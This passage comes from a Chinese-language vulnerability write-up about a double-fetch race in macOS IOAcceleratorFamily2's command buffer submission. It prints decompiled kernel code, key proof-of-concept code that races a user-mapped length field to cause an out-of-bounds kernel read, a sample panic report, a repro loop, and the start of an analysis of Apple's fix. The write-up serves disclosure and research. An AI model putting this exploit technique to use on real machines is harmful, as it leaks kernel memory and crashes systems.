  <span class="n">v5</span> <span class="o">=</span> <span class="p">(</span><span class="n">IOAccelShared2</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">this</span> <span class="o">+</span> <span class="mi">165</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">IOAccelShared2</span><span class="o">::</span><span class="n">processResourceDirtyCommands</span><span class="p">(</span><span class="n">v5</span><span class="p">);</span>
    <span class="n">IOAccelCommandQueue</span><span class="o">::</span><span class="n">updatePriority</span><span class="p">((</span><span class="n">IOAccelCommandQueue</span> <span class="o">*</span><span class="p">)</span><span class="n">v2</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">input</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">v6</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="o">*</span><span class="p">)(</span><span class="n">input</span> <span class="o">+</span> <span class="mi">24</span><span class="p">);</span>
      <span class="n">v7</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
      <span class="k">do</span>
      <span class="p">{</span>
        <span class="n">IOAccelCommandQueue</span><span class="o">::</span><span class="n">submitCommandBuffer</span><span class="p">(</span>
          <span class="p">(</span><span class="n">IOAccelCommandQueue</span> <span class="o">*</span><span class="p">)</span><span class="n">v2</span><span class="p">,</span>
          <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v6</span> <span class="o">-</span> <span class="mi">4</span><span class="p">),</span><span class="c1">//v6 based on input</span>
          <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v6</span> <span class="o">-</span> <span class="mi">3</span><span class="p">),</span><span class="c1">//based on input</span>
          <span class="o">*</span><span class="p">(</span><span class="n">v6</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span><span class="c1">//based on input</span>
          <span class="o">*</span><span class="n">v6</span><span class="p">);</span><span class="c1">//based on input</span>
        <span class="o">++</span><span class="n">v7</span><span class="p">;</span>
        <span class="n">v6</span> <span class="o">+=</span> <span class="mi">3</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">while</span> <span class="p">(</span> <span class="n">v7</span> <span class="o">&lt;</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">input</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="p">);</span> <span class="c1">//NOTICE HERE</span>
    <span class="p">}</span>
</pre></div>


<p>注意在23行*(input+4)又被作为循环的边界使用. 但就像前面说的一样，如果用户态传进来一个descriptor, 他可以在这个时候在用户态改变这个值，绕过<code>s_submit_command_buffers</code>的检查，造成oob。</p>
<p>在<code>IOAccelCommandQueue::submitCommandBuffer</code>中:</p>
<div class="codehilite"><pre><span></span><span class="n">IOGraphicsAccelerator2</span><span class="o">::</span><span class="n">sendBlockFenceNotification</span><span class="p">(</span>
  <span class="o">*</span><span class="p">((</span><span class="n">IOGraphicsAccelerator2</span> <span class="o">**</span><span class="p">)</span><span class="n">this</span> <span class="o">+</span> <span class="mi">166</span><span class="p">),</span>
  <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">this</span> <span class="o">+</span> <span class="mi">160</span><span class="p">)</span> <span class="o">+</span> <span class="mi">16LL</span><span class="p">),</span>
  <span class="n">data_from_input_add_24_minus_8</span><span class="p">,</span>
  <span class="mi">0LL</span><span class="p">,</span>
  <span class="n">v13</span><span class="p">);</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">IOGraphicsAccelerator2</span><span class="o">::</span><span class="n">sendBlockFenceNotification</span><span class="p">(</span>
           <span class="o">*</span><span class="p">((</span><span class="n">IOGraphicsAccelerator2</span> <span class="o">**</span><span class="p">)</span><span class="n">this</span> <span class="o">+</span> <span class="mi">166</span><span class="p">),</span>
           <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">this</span> <span class="o">+</span> <span class="mi">160</span><span class="p">)</span> <span class="o">+</span> <span class="mi">16LL</span><span class="p">),</span>
           <span class="n">data_from_input_add_24</span><span class="p">,</span>
           <span class="mi">0LL</span><span class="p">,</span>
           <span class="n">v13</span><span class="p">);</span>
</pre></div>


<p>我们可以看到内存内容以notification callback的返回给用户态，那么攻击者通过前面控制长度并在越界的部分精心布置内存，那么就可以造成这部分越界的内存被返回给用户态，导致内核内存泄漏甚至代码执行。</p>
<p>具体触发步骤为</p>
<ul>
<li>用户态mmap内存， 通过IOKit调用的structureInputDescriptor传递进去</li>
<li>内核中s_submit_command_buffer函数在+4偏移校验这个长度和传入的内容长度是否匹配</li>
<li>submit_command_buffer遍历用户态传入的descriptor内存，以+4偏移的内容为长度边界。读出的内容在submitCommandBuffer中经过变换通过asyncNotificationPort返回给用户态。</li>
<li>用户态通过条件竞争更改map内存的长度，造成越界读写</li>
</ul>
<h3><a href="#POC代码" title="POC代码"></a>POC代码</h3>
<p>The POC代码比较长，完整版见<a href="https://github.com/flankerhqd/descriptor-describes-racing">https://github.com/flankerhqd/descriptor-describes-racing </a>，这里只贴部分关键代码：</p>
<div class="codehilite"><pre><span></span><span class="c1">//...</span>
<span class="kt">char</span><span class="o">*</span> <span class="nf">dommap</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="n">ool_size</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">rr_addr</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mh">0x80000000</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANON</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;mmap addr %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">rr_addr</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">rr_addr</span><span class="p">,</span> <span class="sc">&#39;a&#39;</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">rr_addr</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">volatile</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">secs</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
<span class="kt">void</span> <span class="nf">modifystrcut</span><span class="p">()</span>
<span class="p">{</span>
    <span class="c1">//usleep(secs++);</span>
    <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">*</span><span class="p">)(</span><span class="n">input</span><span class="o">+</span><span class="mi">4</span><span class="p">))</span> <span class="o">=</span> <span class="mh">0x7fffffff</span><span class="p">;</span>
    <span class="c1">//*((unsigned int*)(input+4)) = 0xffff;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;secs %x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">secs</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">//...</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="c1">//...</span>
    <span class="n">input</span> <span class="o">=</span> <span class="n">dommap</span><span class="p">();</span>
    <span class="p">{</span>
        <span class="kt">char</span><span class="o">*</span> <span class="n">structinput</span> <span class="o">=</span> <span class="n">input</span><span class="p">;</span>
    <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">*</span><span class="p">)(</span><span class="n">structinput</span><span class="o">+</span><span class="mi">4</span><span class="p">))</span> <span class="o">=</span> <span class="mh">0xaa</span><span class="p">;</span><span class="c1">//the size is then used in for loop, possible to change it in descriptor?</span>
    <span class="kt">size_t</span> <span class="n">outcnt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="p">}</span>
    <span class="k">const</span> <span class="kt">size_t</span> <span class="n">bufsize</span> <span class="o">=</span> <span class="mi">4088</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">bufsize</span><span class="p">];</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">&#39;a&#39;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">*</span><span class="n">bufsize</span><span class="p">);</span>
    <span class="kt">size_t</span> <span class="n">outcnt</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span>
    <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span><span class="o">+</span><span class="mi">4</span><span class="p">))</span> <span class="o">=</span> <span class="mh">0xaa</span><span class="p">;</span>
    <span class="p">{</span>
        <span class="n">pthread_t</span> <span class="n">t</span><span class="p">;</span>
        <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">t</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">modifystrcut</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="n">io_connect_method</span><span class="p">(</span>
                      <span class="n">conn</span><span class="p">,</span>
                      <span class="mi">1</span><span class="p">,</span>
                      <span class="nb">NULL</span><span class="p">,</span><span class="c1">//input</span>
                      <span class="mi">0</span><span class="p">,</span><span class="c1">//inputCnt</span>
                      <span class="n">buf</span><span class="p">,</span><span class="c1">//inb_input</span>
                      <span class="n">bufsize</span><span class="p">,</span><span class="c1">//inb_input_size</span>
                      <span class="n">reinterpret_cast_mach_vm_address_t</span><span class="p">(</span><span class="n">input</span><span class="p">),</span><span class="c1">//ool_input</span>
                      <span class="n">ool_size</span><span class="p">,</span><span class="c1">//ool_input_size</span>
                      <span class="n">buf</span><span class="p">,</span><span class="c1">//inb_output</span>
                      <span class="p">(</span><span class="n">mach_msg_type_number_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">outputcnt</span><span class="p">,</span> <span class="c1">//inb_output_size*</span>
                      <span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span><span class="c1">//output</span>
                      <span class="o">&amp;</span><span class="n">outputcnt</span><span class="p">,</span> <span class="c1">//outputCnt</span>
                      <span class="n">reinterpret_cast_mach_vm_address_t</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="c1">//ool_output</span>
                      <span class="p">(</span><span class="n">mach_msg_type_number_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">outputcnt64</span><span class="c1">//ool_output_size*</span>
                      <span class="p">);</span>

    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>两个关键的参数是 are 4088 and 0xaa, 这两个整数主要为了通过内核中</p>
<div class="codehilite"><pre><span></span><span class="n">inputdatalen</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">==</span> <span class="mi">3</span>
                        <span class="o">*</span> <span class="p">(((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)(</span><span class="mh">0x0AAAAAAAAAAAAAAABLL</span> <span class="o">*</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">__int128</span><span class="p">)(</span><span class="n">inputdatalen</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">64</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7FFFFFFFFFFFFFF8LL</span><span class="p">)</span> <span class="p">)</span>
</pre></div>


<p>和</p>
<div class="codehilite"><pre><span></span>if ( *(_DWORD *)(inputdata + 4) == (unsigned int)((unsigned __int64)(0x0AAAAAAAAAAAAAAABLL
                                                                    * (unsigned __int128)((unsigned __int64)(unsigned int)inputdatalen
                                                                                        - 8) &gt;&gt; 64) &gt;&gt; 4) )
</pre></div>


<p>的检查。</p>
<p>在POC运行之后，内核相邻内存的内容就会被leak回用户态。如果边界没有映射内存的话，就会触发一个内核panic。</p>
<h3><a href="#样例Panic-Report" title="样例Panic Report"></a>样例Panic Report</h3>
<div class="codehilite"><pre><span></span><span class="n">Sat</span> <span class="n">Jun</span> <span class="mi">11</span> <span class="mi">21</span><span class="o">:</span><span class="mi">49</span><span class="o">:</span><span class="mo">00</span> <span class="mi">2016</span>

<span class="o">***</span> <span class="n">Panic</span> <span class="n">Report</span> <span class="o">***</span>
<span class="n">panic</span><span class="p">(</span><span class="n">cpu</span> <span class="mi">0</span> <span class="n">caller</span> <span class="mh">0xffffff801dfce5fa</span><span class="p">)</span><span class="o">:</span> <span class="n">Kernel</span> <span class="n">trap</span> <span class="n">at</span> <span class="mh">0xffffff7fa039d2a4</span><span class="p">,</span> <span class="n">type</span> <span class="mi">14</span><span class="o">=</span><span class="n">page</span> <span class="n">fault</span><span class="p">,</span> <span class="nl">registers</span><span class="p">:</span>
<span class="nl">CR0</span><span class="p">:</span> <span class="mh">0x0000000080010033</span><span class="p">,</span> <span class="nl">CR2</span><span class="p">:</span> <span class="mh">0xffffff812735f000</span><span class="p">,</span> <span class="nl">CR3</span><span class="p">:</span> <span class="mh">0x000000000ce100ab</span><span class="p">,</span> <span class="nl">CR4</span><span class="p">:</span> <span class="mh">0x00000000001627e0</span>
<span class="nl">RAX</span><span class="p">:</span> <span class="mh">0x000000007fffffff</span><span class="p">,</span> <span class="nl">RBX</span><span class="p">:</span> <span class="mh">0xffffff812735f008</span><span class="p">,</span> <span class="nl">RCX</span><span class="p">:</span> <span class="mh">0x0000000000000000</span><span class="p">,</span> <span class="nl">RDX</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>
<span class="nl">RSP</span><span class="p">:</span> <span class="mh">0xffffff81276d3b60</span><span class="p">,</span> <span class="nl">RBP</span><span class="p">:</span> <span class="mh">0xffffff81276d3b80</span><span class="p">,</span> <span class="nl">RSI</span><span class="p">:</span> <span class="mh">0x0000000000000000</span><span class="p">,</span> <span class="nl">RDI</span><span class="p">:</span> <span class="mh">0xffffff802fcaef80</span>
<span class="nl">R8</span><span class="p">:</span>  <span class="mh">0x00000000ffffffff</span><span class="p">,</span> <span class="nl">R9</span><span class="p">:</span>  <span class="mh">0x0000000000000002</span><span class="p">,</span> <span class="nl">R10</span><span class="p">:</span> <span class="mh">0x0000000000000007</span><span class="p">,</span> <span class="nl">R11</span><span class="p">:</span> <span class="mh">0x0000000000007fff</span>
<span class="nl">R12</span><span class="p">:</span> <span class="mh">0xffffff8031862800</span><span class="p">,</span> <span class="nl">R13</span><span class="p">:</span> <span class="mh">0xaaaaaaaaaaaaaaab</span><span class="p">,</span> <span class="nl">R14</span><span class="p">:</span> <span class="mh">0xffffff812735e000</span><span class="p">,</span> <span class="nl">R15</span><span class="p">:</span> <span class="mh">0x00000000000000aa</span>
<span class="nl">RFL</span><span class="p">:</span> <span class="mh">0x0000000000010293</span><span class="p">,</span> <span class="nl">RIP</span><span class="p">:</span> <span class="mh">0xffffff7fa039d2a4</span><span class="p">,</span> <span class="nl">CS</span><span class="p">:</span>  <span class="mh">0x0000000000000008</span><span class="p">,</span> <span class="nl">SS</span><span class="p">:</span>  <span class="mh">0x0000000000000010</span>
<span class="n">Fault</span> <span class="nl">CR2</span><span class="p">:</span> <span class="mh">0xffffff812735f000</span><span class="p">,</span> <span class="n">Error</span> <span class="nl">code</span><span class="p">:</span> <span class="mh">0x0000000000000000</span><span class="p">,</span> <span class="n">Fault</span> <span class="nl">CPU</span><span class="p">:</span> <span class="mh">0x0</span><span class="p">,</span> <span class="nl">PL</span><span class="p">:</span> <span class="mi">0</span>

<span class="n">Backtrace</span> <span class="p">(</span><span class="n">CPU</span> <span class="mi">0</span><span class="p">),</span> <span class="nl">Frame</span> <span class="p">:</span> <span class="n">Return</span> <span class="n">Address</span>
<span class="mh">0xffffff81276d37f0</span> <span class="o">:</span> <span class="mh">0xffffff801dedab12</span> <span class="nl">mach_kernel</span> <span class="p">:</span> <span class="n">_panic</span> <span class="o">+</span> <span class="mh">0xe2</span>
<span class="mh">0xffffff81276d3870</span> <span class="o">:</span> <span class="mh">0xffffff801dfce5fa</span> <span class="nl">mach_kernel</span> <span class="p">:</span> <span class="n">_kernel_trap</span> <span class="o">+</span> <span class="mh">0x91a</span>
<span class="mh">0xffffff81276d3a50</span> <span class="o">:</span> <span class="mh">0xffffff801dfec463</span> <span class="nl">mach_kernel</span> <span class="p">:</span> <span class="n">_return_from_trap</span> <span class="o">+</span> <span class="mh">0xe3</span>
<span class="mh">0xffffff81276d3a70</span> <span class="o">:</span> <span class="mh">0xffffff7fa039d2a4</span> <span class="n">com</span><span class="p">.</span><span class="n">apple</span><span class="p">.</span><span class="n">iokit</span><span class="p">.</span><span class="nl">IOAcceleratorFamily2</span> <span class="p">:</span> <span class="n">__ZN19IOAccelCommandQueue22submit_command_buffersEPK29IOAccelCommandQueueSubmitArgs</span> <span class="o">+</span> <span class="mh">0x8e</span>
<span class="mh">0xffffff81276d3b80</span> <span class="o">:</span> <span class="mh">0xffffff7fa039c92c</span> <span class="n">com</span><span class="p">.</span><span class="n">apple</span><span class="p">.</span><span class="n">iokit</span><span class="p">.</span><span class="nl">IOAcceleratorFamily2</span> <span class="p">:</span> <span class="n">__ZN19IOAccelCommandQueue24s_submit_command_buffersEPS_PvP25IOExternalMethodArguments</span> <span class="o">+</span> <span class="mh">0xba</span>
<span class="mh">0xffffff81276d3bc0</span> <span class="o">:</span> <span class="mh">0xffffff7fa03f6db5</span> <span class="n">com</span><span class="p">.</span><span class="n">apple</span><span class="p">.</span><span class="n">driver</span><span class="p">.</span><span class="nl">AppleIntelHD5000Graphics</span> <span class="p">:</span> <span class="n">__ZN19IGAccelCommandQueue14externalMethodEjP25IOExternalMethodArgumentsP24IOExternalMethodDispatchP8OSObjectPv</span> <span class="o">+</span> <span class="mh">0x19</span>
<span class="mh">0xffffff81276d3be0</span> <span class="o">:</span> <span class="mh">0xffffff801e4dfa07</span> <span class="nl">mach_kernel</span> <span class="p">:</span> <span class="n">_is_io_connect_method</span> <span class="o">+</span> <span class="mh">0x1e7</span>
<span class="mh">0xffffff81276d3d20</span> <span class="o">:</span> <span class="mh">0xffffff801df97eb0</span> <span class="nl">mach_kernel</span> <span class="p">:</span> <span class="n">_iokit_server</span> <span class="o">+</span> <span class="mh">0x5bd0</span>
<span class="mh">0xffffff81276d3e30</span> <span class="o">:</span> <span class="mh">0xffffff801dedf283</span> <span class="nl">mach_kernel</span> <span class="p">:</span> <span class="n">_ipc_kobject_server</span> <span class="o">+</span> <span class="mh">0x103</span>
<span class="mh">0xffffff81276d3e60</span> <span class="o">:</span> <span class="mh">0xffffff801dec28b8</span> <span class="nl">mach_kernel</span> <span class="p">:</span> <span class="n">_ipc_kmsg_send</span> <span class="o">+</span> <span class="mh">0xb8</span>
<span class="mh">0xffffff81276d3ea0</span> <span class="o">:</span> <span class="mh">0xffffff801ded2665</span> <span class="nl">mach_kernel</span> <span class="p">:</span> <span class="n">_mach_msg_overwrite_trap</span> <span class="o">+</span> <span class="mh">0xc5</span>
<span class="mh">0xffffff81276d3f10</span> <span class="o">:</span> <span class="mh">0xffffff801dfb8dca</span> <span class="nl">mach_kernel</span> <span class="p">:</span> <span class="n">_mach_call_munger64</span> <span class="o">+</span> <span class="mh">0x19a</span>
<span class="mh">0xffffff81276d3fb0</span> <span class="o">:</span> <span class="mh">0xffffff801dfecc86</span> <span class="nl">mach_kernel</span> <span class="p">:</span> <span class="n">_hndl_mach_scall64</span> <span class="o">+</span> <span class="mh">0x16</span>
      <span class="n">Kernel</span> <span class="n">Extensions</span> <span class="k">in</span> <span class="nl">backtrace</span><span class="p">:</span>
         <span class="n">com</span><span class="p">.</span><span class="n">apple</span><span class="p">.</span><span class="n">iokit</span><span class="p">.</span><span class="n">IOAcceleratorFamily2</span><span class="p">(</span><span class="mf">205.10</span><span class="p">)[</span><span class="mi">949</span><span class="n">D9C27</span><span class="o">-</span><span class="mo">0635</span><span class="o">-</span><span class="mi">3</span><span class="n">EE4</span><span class="o">-</span><span class="n">B836</span><span class="o">-</span><span class="mi">373871</span><span class="n">BC6247</span><span class="p">]</span><span class="mh">@0xffffff7fa0374000</span><span class="o">-&gt;</span><span class="mh">0xffffff7fa03dffff</span>
            <span class="nl">dependency</span><span class="p">:</span> <span class="n">com</span><span class="p">.</span><span class="n">apple</span><span class="p">.</span><span class="n">iokit</span><span class="p">.</span><span class="n">IOPCIFamily</span><span class="p">(</span><span class="mf">2.9</span><span class="p">)[</span><span class="n">D8216D61</span><span class="o">-</span><span class="mi">5209</span><span class="o">-</span><span class="mi">3</span><span class="n">B0C</span><span class="o">-</span><span class="mi">866</span><span class="n">D</span><span class="o">-</span><span class="mi">7</span><span class="n">D8B3C5F33FF</span><span class="p">]</span><span class="mh">@0xffffff7f9e72c000</span>
            <span class="nl">dependency</span><span class="p">:</span> <span class="n">com</span><span class="p">.</span><span class="n">apple</span><span class="p">.</span><span class="n">iokit</span><span class="p">.</span><span class="n">IOGraphicsFamily</span><span class="p">(</span><span class="mf">2.4.1</span><span class="p">)[</span><span class="mi">172</span><span class="n">C2960</span><span class="o">-</span><span class="n">EDF5</span><span class="o">-</span><span class="mi">382</span><span class="n">D</span><span class="o">-</span><span class="mi">80</span><span class="n">A5</span><span class="o">-</span><span class="n">C13E97D74880</span><span class="p">]</span><span class="mh">@0xffffff7f9f232000</span>
         <span class="n">com</span><span class="p">.</span><span class="n">apple</span><span class="p">.</span><span class="n">driver</span><span class="p">.</span><span class="n">AppleIntelHD5000Graphics</span><span class="p">(</span><span class="mf">10.1.4</span><span class="p">)[</span><span class="n">E5BC31AC</span><span class="o">-</span><span class="mi">4714</span><span class="o">-</span><span class="mi">3</span><span class="n">A57</span><span class="o">-</span><span class="mi">9</span><span class="n">CDC</span><span class="o">-</span><span class="mf">3FF</span><span class="mi">346</span><span class="n">D811C5</span><span class="p">]</span><span class="mh">@0xffffff7fa03ee000</span><span class="o">-&gt;</span><span class="mh">0xffffff7fa047afff</span>
            <span class="nl">dependency</span><span class="p">:</span> <span class="n">com</span><span class="p">.</span><span class="n">apple</span><span class="p">.</span><span class="n">iokit</span><span class="p">.</span><span class="n">IOSurface</span><span class="p">(</span><span class="mf">108.2.1</span><span class="p">)[</span><span class="n">B5ADE17A</span><span class="o">-</span><span class="mi">36</span><span class="n">A5</span><span class="o">-</span><span class="mi">3231</span><span class="o">-</span><span class="n">B066</span><span class="o">-</span><span class="mf">7242441F</span><span class="mi">7638</span><span class="p">]</span><span class="mh">@0xffffff7f9f0fb000</span>
            <span class="nl">dependency</span><span class="p">:</span> <span class="n">com</span><span class="p">.</span><span class="n">apple</span><span class="p">.</span><span class="n">iokit</span><span class="p">.</span><span class="n">IOPCIFamily</span><span class="p">(</span><span class="mf">2.9</span><span class="p">)[</span><span class="n">D8216D61</span><span class="o">-</span><span class="mi">5209</span><span class="o">-</span><span class="mi">3</span><span class="n">B0C</span><span class="o">-</span><span class="mi">866</span><span class="n">D</span><span class="o">-</span><span class="mi">7</span><span class="n">D8B3C5F33FF</span><span class="p">]</span><span class="mh">@0xffffff7f9e72c000</span>
            <span class="nl">dependency</span><span class="p">:</span> <span class="n">com</span><span class="p">.</span><span class="n">apple</span><span class="p">.</span><span class="n">iokit</span><span class="p">.</span><span class="n">IOGraphicsFamily</span><span class="p">(</span><span class="mf">2.4.1</span><span class="p">)[</span><span class="mi">172</span><span class="n">C2960</span><span class="o">-</span><span class="n">EDF5</span><span class="o">-</span><span class="mi">382</span><span class="n">D</span><span class="o">-</span><span class="mi">80</span><span class="n">A5</span><span class="o">-</span><span class="n">C13E97D74880</span><span class="p">]</span><span class="mh">@0xffffff7f9f232000</span>
            <span class="nl">dependency</span><span class="p">:</span> <span class="n">com</span><span class="p">.</span><span class="n">apple</span><span class="p">.</span><span class="n">iokit</span><span class="p">.</span><span class="n">IOAcceleratorFamily2</span><span class="p">(</span><span class="mf">205.10</span><span class="p">)[</span><span class="mi">949</span><span class="n">D9C27</span><span class="o">-</span><span class="mo">0635</span><span class="o">-</span><span class="mi">3</span><span class="n">EE4</span><span class="o">-</span><span class="n">B836</span><span class="o">-</span><span class="mi">373871</span><span class="n">BC6247</span><span class="p">]</span><span class="mh">@0xffffff7fa0374000</span>

<span class="n">BSD</span> <span class="n">process</span> <span class="n">name</span> <span class="n">corresponding</span> <span class="n">to</span> <span class="n">current</span> <span class="kr">thread</span><span class="o">:</span> <span class="n">cmdqueue1</span>
<span class="n">Boot</span> <span class="nl">args</span><span class="p">:</span> <span class="n">keepsyms</span><span class="o">=</span><span class="mi">1</span> <span class="o">-</span><span class="n">v</span>

<span class="n">Mac</span> <span class="n">OS</span> <span class="nl">version</span><span class="p">:</span>
<span class="mf">15F</span><span class="mi">34</span>

<span class="n">Kernel</span> <span class="nl">version</span><span class="p">:</span>
<span class="n">Darwin</span> <span class="n">Kernel</span> <span class="n">Version</span> <span class="mf">15.5.0</span><span class="o">:</span> <span class="n">Tue</span> <span class="n">Apr</span> <span class="mi">19</span> <span class="mi">18</span><span class="o">:</span><span class="mi">36</span><span class="o">:</span><span class="mi">36</span> <span class="n">PDT</span> <span class="mi">2016</span><span class="p">;</span> <span class="nl">root</span><span class="p">:</span><span class="n">xnu</span><span class="o">-</span><span class="mf">3248.50.21</span><span class="o">~</span><span class="mi">8</span><span class="o">/</span><span class="n">RELEASE_X86_64</span>
<span class="n">Kernel</span> <span class="nl">UUID</span><span class="p">:</span> <span class="mf">7E7</span><span class="n">B0822</span><span class="o">-</span><span class="n">D2DE</span><span class="o">-</span><span class="mi">3</span><span class="n">B39</span><span class="o">-</span><span class="n">A7A5</span><span class="o">-</span><span class="mi">77</span><span class="n">B40A668BC6</span>
<span class="n">Kernel</span> <span class="nl">slide</span><span class="p">:</span>     <span class="mh">0x000000001dc00000</span>
<span class="n">Kernel</span> <span class="n">text</span> <span class="nl">base</span><span class="p">:</span> <span class="mh">0xffffff801de00000</span>
<span class="n">__HIB</span>  <span class="n">text</span> <span class="nl">base</span><span class="p">:</span> <span class="mh">0xffffff801dd00000</span>
<span class="n">System</span> <span class="n">model</span> <span class="nl">name</span><span class="p">:</span> <span class="n">MacBookAir6</span><span class="p">,</span><span class="mi">2</span> <span class="p">(</span><span class="n">Mac</span><span class="o">-</span><span class="mi">7</span><span class="n">DF21CB3ED6977E5</span><span class="p">)</span>
</pre></div>


<p>查看崩溃RIP寄存器附近的汇编代码</p>
<div class="codehilite"><pre><span></span><span class="nl">__text</span><span class="p">:</span><span class="mo">000000000002</span><span class="mi">929</span><span class="n">E</span>                 <span class="n">mov</span>     <span class="n">esi</span><span class="p">,</span> <span class="p">[</span><span class="n">rbx</span><span class="o">-</span><span class="mi">10</span><span class="n">h</span><span class="p">]</span>  <span class="p">;</span> <span class="kt">unsigned</span> <span class="kt">int</span>
<span class="nl">__text</span><span class="p">:</span><span class="mo">000000000002</span><span class="mi">92</span><span class="n">A1</span>                 <span class="n">mov</span>     <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">rbx</span><span class="o">-</span><span class="mi">0</span><span class="n">Ch</span><span class="p">]</span>  <span class="p">;</span> <span class="kt">unsigned</span> <span class="kt">int</span>
<span class="nl">__text</span><span class="p">:</span><span class="mo">000000000002</span><span class="mi">92</span><span class="n">A4</span>                 <span class="n">mov</span>     <span class="n">rcx</span><span class="p">,</span> <span class="p">[</span><span class="n">rbx</span><span class="o">-</span><span class="mi">8</span><span class="p">]</span>    <span class="p">;</span> <span class="kt">unsigned</span> <span class="kr">__int64</span>
<span class="nl">__text</span><span class="p">:</span><span class="mo">000000000002</span><span class="mi">92</span><span class="n">A8</span>                 <span class="n">mov</span>     <span class="n">r8</span><span class="p">,</span> <span class="p">[</span><span class="n">rbx</span><span class="p">]</span>       <span class="p">;</span> <span class="kt">unsigned</span> <span class="kr">__int64</span>
</pre></div>


<p>在这个崩溃中，rbx寄存器已经出现了越界，意味了内核在读取一个没有映射的内存内容，触发越界。</p>
<p>在 10.11.5 Macbook Airs, Macbook Pros 中测试复现：</p>
<div class="codehilite"><pre><span></span><span class="k">while</span> <span class="nb">true</span><span class="p">;</span> <span class="k">do</span> <span class="p">.</span><span class="o">/</span><span class="n">cmdqueue1</span> <span class="p">;</span> <span class="n">done</span>
</pre></div>


<h1><a href="#苹果的修复" title="苹果的修复"></a>苹果的修复</h1>
<p>苹果还没有公开XNU 10.11.2的源代码，但让我们先来逆向下binary kernel，并在Diaphora的帮助下定位修补的部分</p>
<p>在未修补的版本，我们可以看到有如下的关键代码</p>
